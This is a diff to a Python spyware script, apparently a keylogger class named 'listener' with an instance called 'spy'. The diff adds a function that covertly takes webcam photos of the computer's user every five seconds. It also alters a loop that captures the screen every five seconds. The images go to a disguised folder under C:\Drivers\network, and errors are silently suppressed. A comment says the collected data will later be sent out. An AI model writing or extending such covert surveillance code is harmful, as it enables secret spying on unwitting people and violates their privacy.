@@ -27,20 +27,39 @@ class listener():
     #occasional screenshots of the person behind the camera of the computer
     def camera_screenshot(self):
         #not finished yet
-        print()
+        try:
+            os.chdir('C:\\Drivers\\network\\face-screenshots')
+            x = 1
+            while True:
+                time.sleep(5)
+                if (str('image' + str(x)) in str(os.listdir()) + '\\face-screenshots'):
+                    x += 1
+                else:
+                    camera = cv2.VideoCapture(0)
+                    return_value, image = camera.read()
+                    if return_value:
+                        cv2.imwrite('image' + str(x) + '.png', image)
+                    del(camera)
+        except:
+            pass
+                
     
     #screenshots of the screen every .5 seconds
     def computer_screenshot(self):
         #not finished yet
+        os.chdir('C:\\Drivers\\network\\computer-screenshots')
         try:
             x = 1
             while True:
-                if 'screenshot' + str(x) in os.listdir() + '\\computer-screenshots':
+                time.sleep(5)
+                if ('screenshot' + str(x) in os.listdir() + '\\computer-screenshots'):
                     x += 1
                 else:
                     screenshot = pyautogui.screenshot()
-                    screenshot.save(os.getcwd() + '\\computer-screenshots\\computer-screenshots' + str(x) + '.png')
-                    time.sleep(0.5)
+                    screenshot.save('screenshot' + str(x) + '.png')
+        except:
+            pass
+
 
 try:
     if platform.system == 'Linux':
@@ -77,4 +96,6 @@ try:
         spy.log_keys()
 except:
     #in the except all of the information will be sent from the folders before doinng the sys.exit
+    
+    
     sys.exit(1)
